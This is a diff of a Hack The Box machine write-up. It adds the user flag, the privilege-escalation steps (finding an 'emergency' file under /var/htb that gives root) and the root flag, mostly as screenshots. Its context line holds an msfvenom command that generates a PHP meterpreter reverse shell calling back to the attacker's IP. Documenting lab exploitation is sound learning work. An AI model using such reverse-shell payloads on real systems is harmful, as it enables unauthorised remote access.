@@ -95,7 +95,56 @@ msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.26 lport=1337 -f raw > re
 
 > RESULT
 
-aa
+
+## USER FLAG
+
+```
+30283e49d8e58ff28c92e1823aa1149c
+```
+
+> GETTING ROOT FLAG
+
+14. When tried to check the sudo permission, got this response.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/25dd5d39-3637-4910-8f5a-fdaaf6e89541)
+
+
+15. Knowing this, then our objective to get privesc is to find non-standar SUID file.
+16. But when I want to use LinEnum, got permission denied.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b42ba521-6297-44ec-a395-92fe41ca38fd)
+
+
+17. I think this is not the intended one, i searched it manually.
+18. Found a directory named htb inside `/var`.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f09974d2-d57e-4f2d-b19b-819f51e0d98e)
+
+
+> OUR INTEREST --> EMERGENCY FILE
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/948ee62e-ef4c-45d0-a359-7dff7d7783aa)
+
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/184c27ca-a3dd-425c-af15-efe1ca7a7ddd)
+
+
+19. Great! We can get root simply by running this file.
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/763a47cf-3d0a-4092-9828-3dc7c6137dc3)
+
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a25796b9-9bbc-4245-9812-65471cb9e805)
+
+
+## ROOT FLAG
+
+```
+ed936fca480d4bfe06be0ca3aff3bccd
+```
+
 
 
 
